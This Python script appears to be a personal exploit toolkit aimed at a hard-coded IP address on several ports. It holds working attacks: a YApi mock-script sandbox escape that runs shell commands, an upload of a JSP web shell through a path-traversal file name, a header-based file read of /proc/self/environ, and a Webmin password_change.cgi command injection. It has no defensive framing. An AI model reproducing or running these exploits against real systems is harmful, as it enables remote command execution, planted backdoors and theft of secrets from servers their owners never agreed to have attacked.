import time
import requests
from HackRequests import hackRequests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


# 命令执行有点问题
def yapi_test(url, email='zhangsan@admin.com', pwd='zhangsan', username='zhangsan', basepath='x', title='j'):
    regurl = f'{url}/api/user/reg'
    regdata = {
        "email": email, "password": pwd, "username": username
    }
    reg = requests.post(url=regurl, data=regdata).json()
    if reg['errmsg'] != '成功！': return '注册失败'
    loginurl = f'{url}/api/user/login'
    logindata = {"email": email, "password": pwd}
    login = requests.session()
    res = login.post(url=loginurl, data=logindata)
    create_project_url = f'{url}/api/project/add'
    for group_id in range(99):
        create_project_data = {"name": basepath, "basepath": basepath, "group_id": "%2d" % group_id, "icon": "code-o",
                               "color": "gray",
                               "project_type": "private"}
        res = login.post(url=create_project_url, data=create_project_data).json()
        print(res)
        if res['errmsg'] == '成功！':
            project_id = res['data']['_id']
            print(project_id)
            print(group_id)
            add_interface_url = '/api/interface/add'
            add_interface_data = {"method": "GET", "catid": "965", "title": title, "path": f"/{title}",
                                  "project_id": project_id}
            res = login.post(url + add_interface_url, data=add_interface_data).json()
            interface_id = res['data']['_id']
            savemock_url = '/api/plugin/advmock/save'
            savemock_data = {"project_id": project_id, "interface_id": interface_id,
                             "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"id;uname -a;pwd\").toString()",
                             "enable": "true"}
            savemock_res = login.post(url=url + savemock_url, data=savemock_data).json()
            print(savemock_res)
            # 无头浏览器点击
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            driver = webdriver.Chrome(executable_path='chromedriver-win64/chromedriver-win64/chromedriver.exe')
            driver.get(url + '/login')
            time.sleep(2)
            driver.find_element_by_id('email').send_keys('zhangsanw@admin.com')
            driver.find_element_by_id('password').send_keys('zhangsan')
            driver.find_element_by_tag_name('button').click()
            driver.get('project_id')

            shell_url = f'/mock/{project_id}/c/d'
            getshell_res = login.get(url=url + shell_url).text
            print(getshell_res)
            break


def upload_file():
    # 要上传的目标URL
    url = "https://123.58.224.8:23642/fileupload/toolsAny"

    # 文件的内容
    file_content = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
        String cmd = request.getParameter("cmd");
        String output = "";
        if(cmd != null) {
            String s = null;
            try {
                Process p = Runtime.getRuntime().exec(cmd,null,null);
                BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
                while((s = sI.readLine()) != null) { output += s+"</br>"; }
            }  catch(IOException e) {   e.printStackTrace();   }
        }
    %>
            <pre><%=output %></pre>"""

    # 文件名和路径
    files = {
        "../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp": (
            "1.jsp", file_content, "text/plain")
    }

    # 发起POST请求
    response = requests.post(url, files=files, verify=False)

    # 打印服务器响应
    print(response.text)


def read_file_vul():
    url = 'http://123.58.224.8:55682/chybeta'
    head = {
        'Accept': '../../../../../../../../proc/self/environ{{'
    }
    res = requests.get(url, headers=head).text
    print(res)


def webmin_rce():
    url = 'https://123.58.224.8:61114/password_change.cgi'
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "https://123.58.224.8:61114/session_login.cgi",
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    }
    data = 'user=rootxx&pam=&expired=2&old=test|pwd&new1=test2&new2=test2'
    res = requests.post(url=url, data=data,verify=False,headers=headers).text
    print(res)

# yapi_test('http://123.58.224.8:23243')
# upload_file()
# read_file_vul()
# webmin_rce()